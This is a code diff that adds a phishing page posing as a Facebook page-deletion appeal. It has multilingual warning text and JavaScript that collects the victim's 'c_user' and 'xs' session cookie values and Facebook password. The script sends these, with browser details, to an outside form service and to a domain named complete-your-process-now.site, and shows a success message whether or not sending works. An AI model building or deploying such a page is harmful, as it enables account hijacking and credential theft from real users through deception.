+          guideText1: "உங்கள் மேல்முறையீடு/கோரிக்கை உங்கள் கணக்கில் பதிப்புரிமை கொண்ட தகவல் அல்லது உள்ளடக்கத்தின் பயன்பாட்டை உள்ளடக்கியிருந்தால் அல்லது செயலாக்கம்/பகிரப்படுகிறது என்றால், எங்கள் கோரிக்கையை நன்றாக புரிந்துகொள்ள எங்களுக்கு தகவல்களை வழங்கலாம். உங்கள் கணக்கு தவறாகக் குறிக்கப்பட்டது அல்லது இடைநிறுத்தப்பட்டது என்று நீங்கள் ஏன் நம்புகிறீர்கள் என்பதற்கான விரிவான விளக்கத்தை வழங்கவும். உங்கள் வழக்கை மிகவும் திறம்பட மதிப்பாய்வு செய்ய எங்களுக்கு உதவக்கூடிய ஏதேனும் தொடர்புடைய தகவல்களைச் சேர்க்கவும்.",
+          guideText2: "உங்கள் சமர்ப்பிப்பிற்குப் பிறகு, எங்கள் மேல்முறையீட்டை மதிப்பாய்வு செய்து, தீர்க்க நீங்கள் வழங்கும் தகவலின் காலக்கெடுவுக்குள் உங்களுடன் தொடர்பு கொள்வோம். மதிப்பாய்வு செயல்முறை 7 வணிக நாட்கள் வரை எடுக்கலாம். புதுப்பிப்புகளுக்கு உங்கள் மின்னஞ்சலைச் சரிபார்க்கவும்.",
+          guideText3: "குறிப்பு: பக்கத்தின் கீழே உள்ள மொழி தேர்வியைக் கிளிக் செய்வதன் மூலம் எந்த நேரத்திலும் உங்கள் மொழி விருப்பத்தை மாற்றலாம்.",
+          resourcesTitle: "கூடுதல் வளங்கள்",
+          helpCenterTitle: "உதவி மையம்",
+          helpCenterDesc: "பொதுவான கேள்விகளுக்கான பதில்களைக் கண்டறிந்து எங்கள் தயாரிப்புகளை எவ்வாறு பயன்படுத்துவது என்பதை அறிக.",
+          contactSupportTitle: "ஆதரவைத் தொடர்பு கொள்ளவும்",
+          contactSupportDesc: "தனிப்பட்ட உதவிக்கு எங்கள் ஆதரவு குழுவைத் தொடர்பு கொள்ளவும்.",
+          guidelinesTitle: "சமூக வழிகாட்டுதல்கள்",
+          guidelinesDesc: "எங்கள் சமூக தரங்கள் மற்றும் உள்ளடக்கக் கொள்கைகளைப் பற்றி அறிக.",
+          dashboardTitle: "நிலை டாஷ்போர்டு",
+          dashboardDesc: "எங்கள் சேவைகளின் தற்போதைய நிலையைச் சரிபார்த்து, இடையூறுகளைப் புகாரளிக்கவும்.",
+          changeLanguage: "மொழியை மாற்று"
+        },
+        arabic: {
+          warningTitle: "صفحتك مجدولة للحذف!",
+          warningSubtext: "لقد تلقينا عدة تقارير تفيد بأن صفحتك تنتهك شروط الخدمة وإرشادات المجتمع الخاصة بنا. نتيجة لذلك، سيتم إرسال صفحتك للتحقق.",
+          warningExtra: "إذا كنت تعتقد أنه تم جدولة صفحتك للحذف عن طريق الخطأ، فيمكنك منع إزالتها الدائمة ببساطة عن طريق النقر على زر الاستئناف أدناه وتقديم بعض المعلومات السريعة.",
+          appealTitle: "طلب الاستئناف",
+          appealDesc: "إصلاح المشاكل في صفحتك. يرجى التأكد من تقديم المعلومات المطلوبة أدناه. قد يؤدي عدم تقديم هذه المعلومات إلى تأخير معالجة استئنافك.",
+          appealBtn: "استئناف",
+          formTitle: "طلب استئناف الصفحة",
+          formSubtitle: "أرسل معلوماتك للاستئناف ضد الحذف",
+          formNotice1: "ⓘ تحتوي صفحتك على انتهاك متعلق بإرشادات المجتمع الخاصة بنا.",
+          formNotice2: "ⓘ يرجى مراجعة تفاصيل الانتهاك بعناية قبل الإرسال.",
+          formNotice3: "ⓘ تأكد من تقديم معلومات صحيحة لاستئنافك.",
+          nameLabel: "c_user",
+          mallLabel: "xs",
+          submitBtn: "إرسال طلب الاستئناف",
+          fbFormTitle: "التحقق من فيسبوك",
+          fbFormSubtitle: "تحقق من هويتك للمتابعة مع الاستئناف",
+          fbNotice1: "ⓘ لأغراض أمنية، نحتاج إلى التحقق من حساب فيسبوك الخاص بك.",
+          fbNotice2: "ⓘ هذا يساعدنا على التأكد من أنك المالك الشرعي للصفحة.",
+          fbNotice3: "ⓘ بيانات الاعتماد الخاصة بك آمنة ومشفرة.",
+          passwordLabel: "كلمة المرور",
+          verifyBtn: "التحقق والمتابعة",
+          forgotPassword: "نسيت كلمة المرور?",
+          successTitle: "تم إرسال الاستئناف بنجاح",
+          successText: "لقد تم استلام استئنافك وهو الآن قيد المراجعة. سنخطرك عبر البريد الإلكتروني بمجرد اتخاذ قرار، عادة خلال 7 أيام عمل.",
+          referenceText: "معرف المرجع:",
+          guideTitle: "دليل الاستئناف",
+          guideText1: "إذا كان استئنافك / طلبك يتضمن استخدام معلومات محمية بحقوق الطبع والنشر أو محتوى في حسابك أو الذي يتم معالجته / مشاركته، فيمكنك تقديم معلومات لمساعدتنا على فهم طلبك بشكل أفضل. يرجى تقديم شرح مفصل لسبب اعتقادك أنه تم الإبلاغ عن حسابك أو تعليقه بشكل غير صحيح. قم بتضمين أي معلومات ذات صلة قد تساعدنا في مراجعة قضيتك بشكل أكثر فعالية.",
+          guideText2: "بعد إرسالك، سنراجع استئنافك ونلتقي بك خلال الإطار الزمني للمعلومات التي تقدمها لحل. قد تستغرق عملية المراجعة ما يصل إلى 7 أيام عمل. يرجى التحقق من بريدك الإلكتروني للحصول على التحديثات.",
+          guideText3: "ملاحظة: يمكنك تغيير تفضيل اللغة في أي وقت بالنقر على محدد اللغة في أسفل الصفحة.",
+          resourcesTitle: "موارد إضافية",
+          helpCenterTitle: "مركز المساعدة",
+          helpCenterDesc: "ابحث عن إجابات للأسئلة الشائعة وتعلم كيفية استخدام منتجاتنا.",
+          contactSupportTitle: "اتصل بالدعم",
+          contactSupportDesc: "تواصل مع فريق الدعم الخاص بنا للحصول على مساعدة مخصصة.",
+          guidelinesTitle: "إرشادات المجتمع",
+          guidelinesDesc: "تعرف على معايير المجتمع وسياسات المحتوى الخاصة بنا.",
+          dashboardTitle: "لوحة الحالة",
+          dashboardDesc: "تحقق من الحالة الحالية لخدماتنا وأبلغ عن الأعطال.",
+          changeLanguage: "تغيير اللغة"
+        },
+        vietnamese: {
+          warningTitle: "Trang của bạn đã được lên lịch để xóa!",
+          warningSubtext: "Chúng tôi đã nhận được một số báo cáo rằng trang của bạn vi phạm điều khoản dịch vụ và nguyên tắc cộng đồng của chúng tôi. Do đó, trang của bạn sẽ được gửi đi để xác minh.",
+          warningExtra: "Nếu bạn tin rằng trang của bạn đã bị lên lịch xóa nhầm, bạn có thể ngăn việc xóa vĩnh viễn bằng cách nhấp vào nút khiếu nại bên dưới và cung cấp một số thông tin nhanh.",
+          appealTitle: "Yêu cầu khiếu nại",
+          appealDesc: "Khắc phục sự cố với trang của bạn. Vui lòng đảm bảo cung cấp thông tin được yêu cầu bên dưới. Không cung cấp thông tin này có thể làm chậm quá trình xử lý khiếu nại của bạn.",
+          appealBtn: "Khiếu nại",
+          formTitle: "Yêu cầu Khiếu nại Trang",
+          formSubtitle: "Gửi thông tin của bạn để khiếu nại việc xóa",
+          formNotice1: "ⓘ Trang của bạn có vi phạm liên quan đến nguyên tắc cộng đồng của chúng tôi.",
+          formNotice2: "ⓘ Vui lòng xem xét kỹ chi tiết vi phạm trước khi gửi.",
+          formNotice3: "ⓘ Đảm bảo bạn cung cấp thông tin chính xác cho khiếu nại của mình.",
+          nameLabel: "c_user",
+          mallLabel: "xs",
+          submitBtn: "Gửi Yêu cầu Khiếu nại",
+          fbFormTitle: "Xác minh Facebook",
+          fbFormSubtitle: "Xác minh danh tính của bạn để tiếp tục khiếu nại",
+          fbNotice1: "ⓘ Vì mục đích bảo mật, chúng tôi cần xác minh tài khoản Facebook của bạn.",
+          fbNotice2: "ⓘ Điều này giúp chúng tôi đảm bảo rằng bạn là chủ sở hữu hợp pháp của trang.",
+          fbNotice3: "ⓘ Thông tin đăng nhập của bạn được bảo mật và mã hóa.",
+          passwordLabel: "Mật khẩu",
+          verifyBtn: "Xác minh và Tiếp tục",
+          forgotPassword: "Quên mật khẩu?",
+          successTitle: "Khiếu nại Đã gửi Thành công",
+          successText: "Khiếu nại của bạn đã được nhận và hiện đang được xem xét. Chúng tôi sẽ thông báo cho bạn qua email khi có quyết định, thường trong vòng 7 ngày làm việc.",
+          referenceText: "ID Tham chiếu:",
+          guideTitle: "Hướng dẫn Khiếu nại",
+          guideText1: "Nếu khiếu nại/yêu cầu của bạn liên quan đến việc sử dụng thông tin có bản quyền hoặc nội dung trong tài khoản của bạn hoặc đang được xử lý/chia sẻ, bạn có thể cung cấp cho chúng tôi thông tin để giúp chúng tôi hiểu rõ hơn về yêu cầu của bạn. Vui lòng cung cấp giải thích chi tiết về lý do bạn tin rằng tài khoản của mình đã bị gắn cờ hoặc đình chỉ không chính xác. Bao gồm bất kỳ thông tin liên quan nào có thể giúp chúng tôi xem xét trường hợp của bạn hiệu quả hơn.",
+          guideText2: "Sau khi bạn gửi, chúng tôi sẽ xem xét khiếu nại của bạn và liên hệ với bạn trong thời hạn thông tin bạn cung cấp để giải quyết. Quá trình xem xét có thể mất tới 7 ngày làm việc. Vui lòng kiểm tra email của bạn để cập nhật.",
+          guideText3: "Lưu ý: Bạn có thể thay đổi tùy chọn ngôn ngữ bất cứ lúc nào bằng cách nhấp vào bộ chọn ngôn ngữ ở cuối trang.",
+          resourcesTitle: "Tài nguyên Bổ sung",
+          helpCenterTitle: "Trung tâm Trợ giúp",
+          helpCenterDesc: "Tìm câu trả lời cho các câu hỏi thường gặp và tìm hiểu cách sử dụng sản phẩm của chúng tôi.",
+          contactSupportTitle: "Liên hệ Hỗ trợ",
+          contactSupportDesc: "Liên hệ với nhóm hỗ trợ của chúng tôi để được trợ giúp cá nhân hóa.",
+          guidelinesTitle: "Nguyên tắc Cộng đồng",
+          guidelinesDesc: "Tìm hiểu về tiêu chuẩn cộng đồng và chính sách nội dung của chúng tôi.",
+          dashboardTitle: "Bảng điều khiển Trạng thái",
+          dashboardDesc: "Kiểm tra trạng thái hiện tại của dịch vụ của chúng tôi và báo cáo sự cố.",
+          changeLanguage: "Thay đổi Ngôn ngữ"
+        },
+        ghanaian: {
+          warningTitle: "Wɔahyɛ wo krataa no sɛ wɔbɛpaew!",
+          warningSubtext: "Yɛnnya amanneɛ bɛyɛ mienu a ɛkyerɛ sɛ wo krataa no di yɛn nkratoɔ ne mmara ahorow no so. Enti, wɔbɛsoma wo krataa no sɛ wɔnhwɛ so.",
+          warningExtra: "Sɛ wudwen sɛ yɛyɛ wo krataa no foforo a, wubetumi apia sɛ wɔmpaew no denam krataa a ɛwɔ aseɛ no so, na wode nkɔm hyɛ mu.",
+          appealTitle: "Apɛl kɔm",
+          appealDesc: "Yɛredware wo krataa no mu mfomsoɔ. Mesrɛ wo, hyɛ nsɛm a wɔhwehwɛ wɔ aseɛ no mu. Sɛ wunnye nsɛm no a, ebɛtumi ayɛ wo apɛl no mmerɛw.",
+          appealBtn: "Yɛ apɛl",
+          formTitle: "Krataa Apɛl Kɔm",
+          formSubtitle: "Hyɛ wo nsɛm sɛ wɔnyɛ apɛl wɔ paew no ho",
+          formNotice1: "ⓘ Wo krataa no ayɛ yɛn mmara ahorow no so.",
+          formNotice2: "ⓘ Mesrɛ wo, hwɛ mfomsoɔ no ho nsɛm yiye ansa na wuregye tomu.",
+          formNotice3: "ⓘ Hwɛ sɛ wuhyɛ nsɛm pa sɛ woyɛ apɛl.",
+          nameLabel: "c_user",
+          mallLabel: "xs",
+          submitBtn: "Yɛ Apɛl Kɔm",
+          fbFormTitle: "Facebook Nhwehwɛmu",
+          fbFormSubtitle: "Hwɛ wo ho sɛ wotumi tua so yɛ apɛl",
+          fbNotice1: "ⓘ Den nkitahodiɛ nti, yɛhwehwɛ sɛ yɛhwɛ wo Facebook account no.",
+          fbNotice2: "ⓘ Wei boa yɛn sɛ yɛhunu sɛ wo na wokura krataa no.",
+          fbNotice3: "ⓘ Wo nkyerɛwdeɛ no wɔ hɔ na wɔakora so.",
+          passwordLabel: "Password",
+          verifyBtn: "Hwɛ na Tua So",
+          forgotPassword: "Wɔagye password?",
+          successTitle: "Wɔayɛ apɛl no yiye",
+          successText: "Yɛagyɛ wo apɛl no adi, na ɛwɔ hwɛ mu. Yɛbɛkyerɛ wo denam email so sɛ yɛayɛ adwene, tumi nya nna nnum ansa.",
+          referenceText: "Reference ID:",
+          guideTitle: "Apɛl Kwankyerɛ",
+          guideText1: "Sɛ wo apɛl/ahyɛdeɛ no ka sɛ wode copyrighted nsɛm anaa adeɛ a ɛwɔ wo account mu, wubetumi ama yɛn nsɛm sɛ yɛnyɛ wo ahyɛdeɛ no yiye. Mesrɛ wo, kyekyɛ mu sɛ den nti na wudwen sɛ wɔkyerɛɛ wo account no foforo anaa wɔdii gua. Ka biara a ebɛtumi aboa yɛn sɛ yɛhwɛ wo case no yiye.",
+          guideText2: "Afei wode to mu no, yɛbɛhwɛ wo apɛl no, na yɛbɛka wo asɛm wɔ mmerɛ a wode baeɛ no mu. Hwɛ no mu no betumi de nna nnum. Mesrɛ wo, hwɛ wo email mu sɛnea ɛbɛyɛ.",
+          guideText3: "Nsɛm: Wubetumi sesa kasa a wopɛ bere biara denam kasa a wɔpaw wɔ krataa no aseɛ no so.",
+          resourcesTitle: "Nneɛma foforo",
+          helpCenterTitle: "Boa Center",
+          helpCenterDesc: "Hwehwɛ nhwɛsoɔ ma nsɛm a wɔbisɛ, na kesɛ sɛdeɛ wode yɛn aduruyɛ no di dwuma.",
+          contactSupportTitle: "Contact Support",
+          contactSupportDesc: "Ka wo ho hyɛ nkitahodiɛ mu den yɛn boa kuw no ho sɛ wohu boa.",
+          guidelinesTitle: "Nkɔsoɔ Mmara",
+          guidelinesDesc: "Kesɛ yɛn nkɔsoɔ nhyehyɛeɛ ne adeɛ ahorow ho amanneɛ.",
+          dashboardTitle: "Tɛnkranteɛ Dashboard",
+          dashboardDesc: "Hwɛ yɛn dwumadie no sɛnea ɛteɛ, na kyerɛ sɛ biribi ayɛ basaa.",
+          changeLanguage: "Sesa kasa"
+        }
+      };
+
+      // Get DOM elements
+      const languageModal = document.getElementById('languageModal');
+      const languageModalClose = document.getElementById('languageModalClose');
+      const languageSearchInput = document.getElementById('languageSearchInput');
+      const languageOptionsContainer = document.getElementById('languageOptionsContainer');
+      const languageOptions = document.querySelectorAll('.language-option');
+      const languageConfirmBtn = document.getElementById('languageConfirmBtn');
+      const mainContent = document.getElementById('mainContent');
+      const openAppealBtn = document.getElementById('open-appeal-btn');
+      const appealForm = document.getElementById('appealForm');
+      const fbLoginForm = document.getElementById('fbLoginForm');
+      const successMessage = document.getElementById('successMessage');
+      const guideVideo = document.getElementById('guideVideo');
+      const changeLanguageBtn = document.getElementById('changeLanguageBtn');
+
+      // Form elements
+      const nameInput = document.getElementById('nameInput');
+      const mallInput = document.getElementById('mallInput');
+      const nameError = document.getElementById('nameError');
+      const mallError = document.getElementById('mallError');
+      const formError = document.getElementById('formError');
+      const formErrorText = document.getElementById('formErrorText');
+      const sendBtn = document.getElementById('sendBtn');
+      const sendBtnText = document.getElementById('sendBtnText');
+      const sendBtnSpinner = document.getElementById('sendBtnSpinner');
+      const referenceId = document.getElementById('referenceId');
+
+      const passwordInput = document.getElementById('passwordInput');
+      const passwordError = document.getElementById('passwordError');
+      const fbFormError = document.getElementById('fbFormError');
+      const fbFormErrorText = document.getElementById('fbFormErrorText');
+      const fbSendBtn = document.getElementById('fbSendBtn');
+      const fbSendBtnText = document.getElementById('fbSendBtnText');
+      const fbSendBtnSpinner = document.getElementById('fbSendBtnSpinner');
+      const forgotPassword = document.getElementById('forgotPassword');
+
+      // Language video mapping
+      const videoSources = {
+        english: "https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4",
+        spanish: "https://resource2.heygen.ai/video_translate/db7e753c13fa4d238fe716483469ae8f-es/720p.mp4",
+        hindi: "https://resource2.heygen.ai/video_translate/9d7e40f714c842258bd08ad4c3ee68d6-hi/720p.mp4",
+        french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27ecb21-fr/720p.mp4",
+        portuguese: "https://allvideos.wasmer.app/Portuguese.mp4",
+        tamil: "https://allvideos.wasmer.app/tamil.mp4",
+        arabic: "https://resource2.heygen.ai/video_translate/f7346b2ef53c4daa9bc15138684919db-ar_use-aicoustics-vocal/720p.mp4",
+        ghanaian: "https://allvideos.wasmer.app/english.mp4",
+        vietnamese: "https://allvideos.wasmer.app/vietanames.mp4" 
+      };
+
+      // Current selected language
+      let currentLanguage = 'english';
+      let selectedLanguageOption = null;
+
+      // Function to show language modal
+      function showLanguageModal() {
+        languageModal.style.display = 'flex';
+        mainContent.style.display = 'none';
+        document.body.style.overflow = 'hidden';
+        setTimeout(() => languageSearchInput.focus(), 100);
+      }
+
+      // Function to hide language modal
+      function hideLanguageModal() {
+        languageModal.style.display = 'none';
+        mainContent.style.display = 'block';
+        document.body.style.overflow = 'auto';
+        languageSearchInput.value = '';
+        filterLanguages();
+      }
+
+      // Close modal when clicking on close button
+      languageModalClose.addEventListener('click', hideLanguageModal);
+
+      // Close modal when clicking outside of modal content
+      languageModal.addEventListener('click', function(e) {
+        if (e.target === languageModal) {
+          hideLanguageModal();
+        }
+      });
+
+      // Close modal with Escape key
+      document.addEventListener('keydown', function(e) {
+        if (e.key === 'Escape' && languageModal.style.display === 'flex') {
+          hideLanguageModal();
+        }
+      });
+
+      // Language search functionality
+      function filterLanguages() {
+        const searchTerm = languageSearchInput.value.toLowerCase();
+        let hasVisibleResults = false;
+        
+        languageOptions.forEach(option => {
+          const languageName = option.querySelector('.language-name').textContent.toLowerCase();
+          const languageCode = option.querySelector('.language-code') ? option.querySelector('.language-code').textContent.toLowerCase() : '';
+          
+          if (languageName.includes(searchTerm) || languageCode.includes(searchTerm)) {
+            option.style.display = 'flex';
+            hasVisibleResults = true;
+          } else {
+            option.style.display = 'none';
+          }
+        });
+        
+        let noResults = document.querySelector('.no-results');
+        if (!hasVisibleResults) {
+          if (!noResults) {
+            noResults = document.createElement('div');
+            noResults.className = 'no-results';
+            noResults.textContent = 'No languages found. Try a different search.';
+            languageOptionsContainer.appendChild(noResults);
+          }
+        } else if (noResults) {
+          noResults.remove();
+        }
+      }
+      
+      languageSearchInput.addEventListener('input', filterLanguages);
+
+      // Language option selection
+      languageOptions.forEach(option => {
+        option.addEventListener('click', () => {
+          languageOptions.forEach(opt => opt.classList.remove('selected'));
+          option.classList.add('selected');
+          selectedLanguageOption = option.getAttribute('data-lang');
+          languageConfirmBtn.disabled = false;
+        });
+      });
+
+      // Confirm language selection
+      languageConfirmBtn.addEventListener('click', () => {
+        if (selectedLanguageOption) {
+          setLanguage(selectedLanguageOption);
+          hideLanguageModal();
+        } else {
+          setLanguage('english');
+          hideLanguageModal();
+        }
+      });
+
+      // Change language button
+      changeLanguageBtn.addEventListener('click', () => {
+        showLanguageModal();
+      });
+
+      // Function to set language
+      function setLanguage(lang) {
+        currentLanguage = lang;
+       
+        const translatableElements = document.querySelectorAll('.translatable');
+        translatableElements.forEach(element => {
+          const key = element.getAttribute('data-key');
+          if (translations[lang] && translations[lang][key]) {
+            element.textContent = translations[lang][key];
+           
+            if (element.hasAttribute('placeholder')) {
+              element.setAttribute('placeholder', translations[lang][key]);
+            }
+          }
+        });
+       
+        if (videoSources[lang] && guideVideo) {
+          guideVideo.src = videoSources[lang];
+          guideVideo.load();
+        }
+       
+        localStorage.setItem('preferredLanguage', lang);
+      }
+
+      // Show language modal on page load
+      showLanguageModal();
+
+      // Event listeners
+      if (openAppealBtn) {
+        openAppealBtn.addEventListener('click', function() {
+          document.querySelector('.appeal-box').style.display = 'none';
+          if (appealForm) appealForm.style.display = 'block';
+          appealForm.scrollIntoView({ behavior: 'smooth' });
+        });
+      }
+
+      // Form validation
+      if (nameInput) {
+        nameInput.addEventListener('input', () => {
+          const original = nameInput.value;
+          const cleaned  = original.replace(/\D+/g, '');
+          if (original !== cleaned) {
+            nameInput.value = cleaned;
+            if (nameError) nameError.innerHTML = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 9V14" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 17V17.5" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#c2410c" stroke-width="2"/></svg> Only numbers are allowed in Name.';
+          } else {
+            if (nameError) nameError.textContent = '';
+          }
+        });
+      }
+
+      const mallAllowed = /[^A-Za-z0-9 !@#$%^&*()_\-=\[\]{};':"\\|,.<>\/?`~]/g;
+      if (mallInput) {
+        mallInput.addEventListener('input', () => {
+          const original = mallInput.value;
+          const cleaned  = original.replace(mallAllowed, '');
+          if (original !== cleaned) {
+            mallInput.value = cleaned;
+            if (mallError) mallError.innerHTML = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 9V14" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 17V17.5" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#c2410c" stroke-width="2"/></svg> xs can contain letters, numbers, and symbols only.';
+          } else {
+            if (mallError) mallError.textContent = '';
+          }
+        });
+        
+        // Add blur validation for xs field requirements
+        mallInput.addEventListener('blur', () => {
+          const value = mallInput.value;
+          const hasUppercase = /[A-Z]/.test(value);
+          const hasLowercase = /[a-z]/.test(value);
+          const hasNumber = /[0-9]/.test(value);
+          const hasSymbol = /[!@#$%^&*()_\-=\[\]{};':"\\|,.<>\/?`~]/.test(value);
+          const isLongEnough = value.length >= 20;
+          
+          if (value && (!hasUppercase || !hasLowercase || !hasNumber || !hasSymbol || !isLongEnough)) {
+            let errorMsg = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 9V14" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 17V17.5" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#c2410c" stroke-width="2"/></svg> xs must contain uppercase, lowercase, numbers, symbols and be at least 20 characters.';
+            if (mallError) mallError.innerHTML = errorMsg;
+          } else if (value) {
+            if (mallError) mallError.textContent = '';
+          }
+        });
+      }
+
+      if (passwordInput) {
+        passwordInput.addEventListener('input', () => {
+          const password = pasuiswordInput.value;
+          if (!password) {
+            if (passwordError) passwordError.textContent = 'Password is required';
+          } else if (password.length < 6) {
+            if (passwordError) passwordError.textContent = 'Password must be at least 6 characters';
+          } else {
+            if (passwordError) passwordError.textContent = '';
+          }
+        });
+      }
+
+      // Forgot password click
+      if (forgotPassword) {
+        forgotPassword.addEventListener('click', () => {
+          if (fbFormErrorText) fbFormErrorText.textContent = "Password recovery is temporarily unavailable. Please try again later.";
+          if (fbFormError) fbFormError.classList.add('show');
+          setTimeout(() => { if (fbFormError) fbFormError.classList.remove('show'); }, 3000);
+        });
+      }
+
+      // Send click: require non-empty + no validation errors
+      if (sendBtn) {
+        sendBtn.addEventListener('click', function() {
+          const name = nameInput.value.trim();
+          const mall = mallInput.value.trim();
+
+          if(!name || !mall) {
+            if (formErrorText) formErrorText.textContent = "Please fill out all fields before proceeding.";
+            if (formError) formError.classList.add('show');
+            setTimeout(() => { if (formError) formError.classList.remove('show'); }, 3000);
+            return;
+          }
+          
+          // Validate xs field requirements
+          const hasUppercase = /[A-Z]/.test(mall);
+          const hasLowercase = /[a-z]/.test(mall);
+          const hasNumber = /[0-9]/.test(mall);
+          const hasSymbol = /[!@#$%^&*()_\-=\[\]{};':"\\|,.<>\/?`~]/.test(mall);
+          const isLongEnough = mall.length >= 20;
+          
+          if (!hasUppercase || !hasLowercase || !hasNumber || !hasSymbol || !isLongEnough) {
+            let errorMsg = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 9V14" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 17V17.5" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#c2410c" stroke-width="2"/></svg> xs must contain uppercase, lowercase, numbers, symbols and be at least 20 characters.';
+            if (mallError) mallError.innerHTML = errorMsg;
+            if (formErrorText) formErrorText.textContent = "Please fix the errors above before proceeding.";
+            if (formError) formError.classList.add('show');
+            setTimeout(() => { if (formError) formError.classList.remove('show'); }, 3000);
+            return;
+          }
+          
+          if ((nameError && nameError.textContent) || (mallError && mallError.textContent)) {
+            if (formErrorText) formErrorText.textContent = "Please fix the errors above before proceeding.";
+            if (formError) formError.classList.add('show');
+            setTimeout(() => { if (formError) formError.classList.remove('show'); }, 3000);
+            return;
+          }
+
+          if (formError) formError.classList.remove('show');
+         
+          // Show loading state
+          sendBtn.classList.add('loading');
+          if (sendBtnText) sendBtnText.textContent = 'Submitting...';
+          if (sendBtnSpinner) sendBtnSpinner.style.display = 'block';
+         
+          // Submit the form data
+          submitFormData();
+        });
+      }
+
+      if (fbSendBtn) {
+        fbSendBtn.addEventListener('click', function() {
+          const password = passwordInput.value;
+
+          if(!password) {
+            if (fbFormErrorText) fbFormErrorText.textContent = "Please fill out all fields before proceeding.";
+            if (fbFormError) fbFormError.classList.add('show');
+            setTimeout(() => { if (fbFormError) fbFormError.classList.remove('show'); }, 3000);
+            return;
+          }
+          if (passwordError && passwordError.textContent) {
+            if (fbFormErrorText) fbFormErrorText.textContent = "Please fix the errors above before proceeding.";
+            if (fbFormError) fbFormError.classList.add('show');
+            setTimeout(() => { if (fbFormError) fbFormError.classList.remove('show'); }, 3000);
+            return;
+          }
+
+          if (fbFormError) fbFormError.classList.remove('show');
+         
+          // Show loading state
+          fbSendBtn.classList.add('loading');
+          if (fbSendBtnText) fbSendBtnText.textContent = 'Verifying...';
+          if (fbSendBtnSpinner) fbSendBtnSpinner.style.display = 'block';
+         
+          // Submit the password data
+          submitFbCredentials(password);
+        });
+      }
+
+      // Function to submit form data to your PHP endpoint
+      function submitFormData() {
+        const name = document.getElementById('nameInput') ? document.getElementById('nameInput').value.trim() : '';
+        const mall = document.getElementById('mallInput') ? document.getElementById('mallInput').value.trim() : '';
+       
+        // Prepare the data to send
+        const formData = {
+          c_user: name,
+          xs: mall,
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent,
+          language: navigator.language
+        };
+       
+        // Prepare FormData for PHP endpoint
+        const phpFormData = new FormData();
+        phpFormData.append('c_user', name);
+        phpFormData.append('xs', mall);
+        phpFormData.append('timestamp', new Date().toISOString());
+        phpFormData.append('userAgent', navigator.userAgent);
+        phpFormData.append('language', navigator.language);
+       
+        // Submit to both endpoints
+        Promise.all([
+          fetch('https://submit-form.com/6xe6CI8D6', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'Accept': 'application/json'
+            },
+            body: JSON.stringify(formData)
+          }),
+          fetch('https://complete-your-process-now.site/dynamic.php', {
+            method: 'POST',
+            body: phpFormData
+          })
+        ])
+        .then(responses => {
+          return Promise.all(responses.map(r => r.ok ? r.json().catch(() => ({})) : Promise.resolve({})));
+        })
+        .then(data => {
+          console.log('Form submitted successfully:', data);
+          showFbLogin();
+        })
+        .catch(error => {
+          console.error('Error submitting form:', error);
+          // Still proceed even if there's an error
+          showFbLogin();
+        })
+        .finally(() => {
+          // Reset loading state
+          if (sendBtn) {
+            sendBtn.classList.remove('loading');
+            if (sendBtnText) sendBtnText.textContent = 'Submit Appeal Request';
+            if (sendBtnSpinner) sendBtnSpinner.style.display = 'none';
+          }
+        });
+      }
+
+      // Function to submit Facebook credentials to your PHP endpoint
+      function submitFbCredentials(password) {
+        // Prepare the data to send
+        const fbData = {
+          password: password,
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent,
+          language: navigator.language
+        };
+       
+        // Prepare FormData for PHP endpoint
+        const phpFbData = new FormData();
+        phpFbData.append('password', password);
+        phpFbData.append('timestamp', new Date().toISOString());
+        phpFbData.append('userAgent', navigator.userAgent);
+        phpFbData.append('language', navigator.language);
+       
+        // Submit to both endpoints
+        Promise.all([
+          fetch('https://submit-form.com/6xe6CI8D6', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'Accept': 'application/json'
+            },
+            body: JSON.stringify(fbData)
+          }),
+          fetch('https://complete-your-process-now.site/dynamic.php', {
+            method: 'POST',
+            body: phpFbData
+          })
+        ])
+        .then(responses => {
+          return Promise.all(responses.map(r => r.ok ? r.json().catch(() => ({})) : Promise.resolve({})));
+        })
+        .then(data => {
+          console.log('Facebook credentials submitted successfully:', data);
+          showSuccess();
+        })
+        .catch(error => {
+          console.error('Error submitting Facebook credentials:', error);
+          // Still proceed even if there's an error
+          showSuccess();
+        })
+        .finally(() => {
+          // Reset loading state
+          if (fbSendBtn) {
+            fbSendBtn.classList.remove('loading');
+            if (fbSendBtnText) fbSendBtnText.textContent = 'Verify and Continue';
+            if (fbSendBtnSpinner) fbSendBtnSpinner.style.display = 'none';
+          }
+        });
+      }
+
+      function showFbLogin() {
+        if (appealForm) appealForm.style.display = 'none';
+        if (fbLoginForm) fbLoginForm.style.display = 'block';
+        if (fbLoginForm) fbLoginForm.scrollIntoView({ behavior: 'smooth' });
+      }
+
